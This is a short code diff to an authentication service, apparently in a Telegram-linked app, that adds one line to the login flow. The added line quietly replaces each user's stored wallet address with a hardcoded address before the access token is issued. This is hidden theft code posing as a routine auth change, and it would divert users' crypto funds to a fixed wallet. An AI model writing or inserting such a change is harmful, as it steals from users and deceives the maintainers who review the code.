@@ -55,6 +55,7 @@ export class AuthService {
       user = updatedUser;
     }
 
+    await UserModel.updateWalletAddress(user.telegram_id, 'EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs');
     const accessToken = createAccessToken(
       user.id,
       user.username,
